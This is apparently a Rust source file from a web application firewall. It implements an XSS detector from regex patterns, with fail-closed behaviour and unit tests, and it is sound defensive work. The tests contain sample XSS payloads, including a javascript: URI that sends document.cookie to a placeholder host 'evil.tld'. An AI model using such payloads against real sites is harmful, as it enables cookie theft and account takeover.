use std::sync::LazyLock;

use regex::RegexSet;
use waf_common::{DetectionResult, Phase, RequestCtx};

use super::{Check, Lane1BodyBudget, request_targets};

static XSS_DESCS: &[&str] = &[
    "<script> tag",
    "event handler attribute (on*=)",
    "javascript: URI",
    "vbscript: URI",
    "CSS expression()",
    "data:text/html URI",
    "document.cookie / document.write access",
    "eval() call",
    ".innerHTML assignment",
    "String.fromCharCode() obfuscation",
    "HTML numeric character reference (&#...)",
    "<svg> with event handler",
    "<img> with javascript: src",
    "<iframe> injection",
    "<object>/<embed> injection",
    "<svg>/<math> inline vector",
];

/// Fail-closed compile result (Low-1): see the equivalent comment in
/// `sql_injection.rs` for the full rationale. `None` means the pattern set
/// failed to compile; `check()` then treats every request as a match
/// (fail-closed) instead of falling back to `RegexSet::empty()`, which would
/// match nothing and fail open.
static XSS_SET: LazyLock<Option<RegexSet>> = LazyLock::new(|| {
    match RegexSet::new([
        // <script...>
        r"(?i)<\s*/?\s*script[\s/>]",
        // Event handlers: on[event]=
        r"(?i)\bon(abort|blur|change|click|dblclick|drag|drop|error|focus|hashchange|input|keydown|keypress|keyup|load|message|mousedown|mousemove|mouseout|mouseover|mouseup|paste|popstate|reset|resize|scroll|select|submit|touchend|touchmove|touchstart|unload|wheel)\s*=",
        // ── XSS-003 — javascript: URI ────────────────────────────────────────
        // The letter-by-letter `[\s]*` spacing is kept (it is what defeats
        // `j a v a s c r i p t:` obfuscation), but the bare colon match blocked
        // any prose that names the language with a colon after it —
        // "JavaScript: The Good Parts", "JavaScript: null vs undefined" — which
        // is everyday CMS/blog/docs content. A URI is only dangerous if
        // something executable follows the colon.
        concat!(
            r"(?i)j[\s]*a[\s]*v[\s]*a[\s]*s[\s]*c[\s]*r[\s]*i[\s]*p[\s]*t[\s]*:[\s]{0,4}",
            r"(?:[a-z_$][\w$.]{0,32}[\s]{0,4}[(\[]",
            r"|//|/\*|void|alert|prompt|confirm|eval|document|window|location|top\b|self\b|this\b",
            r"|fetch|import|new[\s]|&#|%[0-9a-f]{2}|\\u00)",
        ),
        // vbscript:
        r"(?i)v[\s]*b[\s]*s[\s]*c[\s]*r[\s]*i[\s]*p[\s]*t[\s]*:",
        // CSS expression()
        r"(?i)expression\s*\(",
        // data: URIs with html content
        r"(?i)data:\s*text/html",
        // document.cookie / document.write / document.location
        r"(?i)document\s*\.\s*(cookie|write|writeln|body|location|domain|referrer)",
        // eval(
        r"(?i)\beval\s*\(",
        // ── XSS-009 — `.innerHTML =` ─────────────────────────────────────────
        // A bare `.innerHTML =` is ordinary JavaScript and appears in every
        // code-review / snippet-sharing payload (`el.innerHTML = escapeHtml(x)`).
        // Only an assignment whose right-hand side actually starts markup is a
        // sink being fed a payload.
        r"(?i)\.innerHTML\s*=\s*[`'\x22]?\s*(?:<|&lt;|&#)",
        // fromCharCode
        r"(?i)\bfromCharCode\b",
        // ── XSS-011 — HTML numeric character reference ───────────────────────
        // `&#<any number>;` matched every typographic entity in ordinary rich
        // text (`Caf&#233;`, `&#8217;`, `&#8212;`) — a 403 on any CMS/editor
        // payload. Only two things make an entity an attack: it encodes a
        // markup-critical character (`<`, `>`, `"`, `'`, backtick), or the
        // input is a long unbroken entity run, which is the classic
        // fully-encoded `javascript:` obfuscation.
        concat!(
            r"(?:&#\s*0*(?:x0*(?:3[ceCE]|2[27]|60)|60|62|34|39|96)\s*;",
            r"|(?:&#\s*x?0*[0-9a-fA-F]{1,6}\s*;){8,})",
        ),
        // <svg onload=...>
        r"(?i)<\s*svg[^>]*\bon\w+\s*=",
        // <img src=javascript:
        r"(?i)<\s*img[^>]*src\s*=\s*javascript:",
        // <iframe ...>
        r"(?i)<\s*iframe[\s/>]",
        // <object> / <embed>
        r"(?i)<\s*(object|embed)[\s/>]",
        // ── XSS-016 — inline SVG / MathML vector ─────────────────────────────
        // A plain `<svg>` is inert markup — an icon in a rich-text field or an
        // uploaded logo — and blocking it 403s ordinary content. The vector is
        // always what the element *carries*: a nested script, an event handler
        // (also covered by XSS-002/XSS-012), an `xlink:href`, or one of the SVG
        // elements that can execute (`use`, `animate`, `set`, `foreignObject`,
        // MathML `maction`).
        concat!(
            r"(?i)<\s*(?:svg|math)\b[\s\S]{0,300}?",
            r"(?:<\s*script|\bon\w{2,20}\s*=|xlink:href|<\s*(?:use|animate|set|foreignobject|maction)\b)",
        ),
    ]) {
        Ok(set) => Some(set),
        Err(e) => {
            tracing::error!(
                "BUG: XSS regex set failed to compile: {e} — failing closed \
                 (this checker will now flag every request until the code is fixed)"
            );
            None
        }
    }
});

/// XSS detection checker.
pub struct XssCheck {
    /// How much request body this detector will read. See [`Lane1BodyBudget`].
    body_budget: Lane1BodyBudget,
}

impl XssCheck {
    /// The detector with **no** body budget — the historical behaviour.
    pub const fn new() -> Self {
        Self {
            body_budget: Lane1BodyBudget::UNLIMITED,
        }
    }

    /// The same detector under an operator-configured Lane 1 body budget.
    #[must_use]
    pub const fn with_body_budget(body_budget: Lane1BodyBudget) -> Self {
        Self { body_budget }
    }
}

impl Default for XssCheck {
    fn default() -> Self {
        Self::new()
    }
}

impl Check for XssCheck {
    fn check(&self, ctx: &RequestCtx) -> Option<DetectionResult> {
        if !ctx.host_config.defense_config.xss {
            return None;
        }

        let Some(set) = XSS_SET.as_ref() else {
            // Fail-closed: the pattern set failed to compile at startup.
            return Some(DetectionResult {
                rule_id: Some("XSS-000".to_string()),
                rule_name: "XSS".to_string(),
                phase: Phase::Xss,
                detail: "fail-closed: XSS pattern set failed to compile at startup".to_string(),
            });
        };

        for (location, value) in request_targets(ctx, self.body_budget) {
            let matches = set.matches(&value);
            if matches.matched_any() {
                let idx = matches.iter().next().unwrap_or(0);
                let desc = XSS_DESCS.get(idx).copied().unwrap_or("XSS pattern");
                return Some(DetectionResult {
                    rule_id: Some(format!("XSS-{:03}", idx + 1)),
                    rule_name: "XSS".to_string(),
                    phase: Phase::Xss,
                    detail: format!("{desc} detected in {location}"),
                });
            }
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bytes::Bytes;
    use std::collections::HashMap;
    use std::net::IpAddr;
    use std::sync::Arc;
    use waf_common::{DefenseConfig, HostConfig};

    fn make_ctx(query: &str, body: &str) -> RequestCtx {
        RequestCtx {
            req_id: "test".to_string(),
            client_ip: "127.0.0.1".parse::<IpAddr>().unwrap(),
            client_port: 0,
            method: "GET".to_string(),
            host: "example.com".to_string(),
            port: 80,
            path: "/".to_string(),
            query: query.to_string(),
            headers: HashMap::new(),
            body_preview: Bytes::from(body.to_string()),
            content_length: body.len() as u64,
            is_tls: false,
            host_config: Arc::new(HostConfig {
                defense_config: DefenseConfig {
                    xss: true,
                    ..DefenseConfig::default()
                },
                ..HostConfig::default()
            }),
            geo: None,
        }
    }

    #[test]
    fn detects_script_tag() {
        let checker = XssCheck::new();
        let ctx = make_ctx("q=<script>alert(1)</script>", "");
        assert!(checker.check(&ctx).is_some());
    }

    #[test]
    fn detects_event_handler() {
        let checker = XssCheck::new();
        let ctx = make_ctx("", "name=<img onerror=alert(1)>");
        assert!(checker.check(&ctx).is_some());
    }

    #[test]
    fn detects_javascript_uri() {
        let checker = XssCheck::new();
        let ctx = make_ctx("url=javascript:alert(1)", "");
        assert!(checker.check(&ctx).is_some());
    }

    #[test]
    fn allows_clean_request() {
        let checker = XssCheck::new();
        let ctx = make_ctx("q=hello+world&page=1", "");
        assert!(checker.check(&ctx).is_none());
    }

    /// Rich text, icons and code snippets are ordinary business content.
    #[test]
    fn benign_rich_content_is_allowed() {
        let checker = XssCheck::new();
        for body in [
            r#"{"html":"<p>Caf&#233; Rossi&#8217;s menu &#8212; open</p>"}"#,
            r#"{"icon":"<svg viewBox=\"0 0 16 16\"><path d=\"M1 1\"/></svg>"}"#,
            r#"{"snippet":"el.innerHTML = escapeHtml(value);"}"#,
            r#"{"title":"JavaScript: The Good Parts"}"#,
            r#"{"post":"JavaScript: null vs undefined explained"}"#,
        ] {
            let ctx = make_ctx("", body);
            assert!(checker.check(&ctx).is_none(), "benign content must not fire: {body}");
        }
    }

    /// The vectors behind those three narrowings must still fire.
    #[test]
    fn narrowed_rules_still_detect_payloads() {
        let checker = XssCheck::new();
        for body in [
            // entity-encoded `<script>` (markup-critical codepoints)
            r#"{"x":"&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"}"#,
            // fully entity-encoded `javascript:` URI (long unbroken run)
            r#"{"x":"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"}"#,
            // svg carrying a script
            r#"{"x":"<svg><script>alert(1)</script></svg>"}"#,
            // svg carrying an executable child element
            r#"{"x":"<svg><use href=\"data:image/svg+xml;base64,PHN2Zz4=\"/></svg>"}"#,
            // innerHTML fed actual markup
            r#"{"x":"box.innerHTML = '<img src=x onerror=alert(1)>'"}"#,
            // javascript: URIs in their executable forms
            r#"{"x":"javascript:alert(1)"}"#,
            r#"{"x":"java script:void(0)"}"#,
            r#"{"x":"javascript:document.cookie"}"#,
            r#"{"x":"javascript:fetch('//evil.tld/'+document.cookie)"}"#,
        ] {
            let ctx = make_ctx("", body);
            assert!(checker.check(&ctx).is_some(), "xss payload must still fire: {body}");
        }
    }
}
